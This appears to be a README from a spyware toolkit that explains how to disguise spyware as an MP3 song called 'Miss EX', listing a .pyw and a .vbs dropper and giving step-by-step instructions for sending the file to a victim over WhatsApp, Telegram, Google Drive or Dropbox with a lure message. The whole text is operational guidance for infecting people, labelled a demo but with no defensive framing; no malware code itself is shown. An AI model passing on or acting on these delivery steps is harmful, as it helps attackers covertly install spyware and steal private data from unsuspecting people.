DELIVERY TECHNIQUE 2: MALICIOUS FILE (Music File with Hidden Spyware)
================================================================================

PURPOSE:
--------
Hide spyware inside innocent-looking files (MP3 music files)

HOW IT WORKS:
-------------
1. Attacker creates "Miss EX.mp3" - looks like music file
2. When victim opens it: Plays music + Runs spyware in background
3. Victim hears music → Thinks it's safe → Gets infected!
4. Spyware collects data and sends to attacker

FILES IN THIS FOLDER:
---------------------
✓ Miss_EX.pyw - Auto-executing spyware (plays music + runs malware)
✓ Miss_EX.vbs - VBScript version (completely silent)
✓ Miss EX.mp3 - Real MP3 with embedded spyware code
✓ sample_music.mp3 - Music file that gets played

HOW TO USE:
-----------
METHOD A: Send file directly via messaging
   1. Send Miss_EX.pyw via WhatsApp/Telegram to victim
   2. Message: "Hey! Check out this song! 🎵"
   3. Victim opens file → Music plays → Spyware runs!

METHOD B: Upload to file sharing
   1. Upload Miss_EX.pyw to Google Drive/Dropbox
   2. Share link with victim
   3. Victim downloads and opens → Infected!

DEMO SCENARIO:
--------------
"Attacker sends music file 'Miss EX' to victim via WhatsApp.
Victim opens it, hears music playing - thinks it's just a song.
But spyware is running in the background, stealing data!
Victim has no idea they've been infected."

WHICH FILE TO USE:
------------------
✓ BEST: Miss_EX.pyw (Python script - plays music + runs spyware)
✓ SILENT: Miss_EX.vbs (VBScript - completely invisible)
✓ DEMO: Miss EX.mp3 (Real MP3 with code inside - for showing concept)
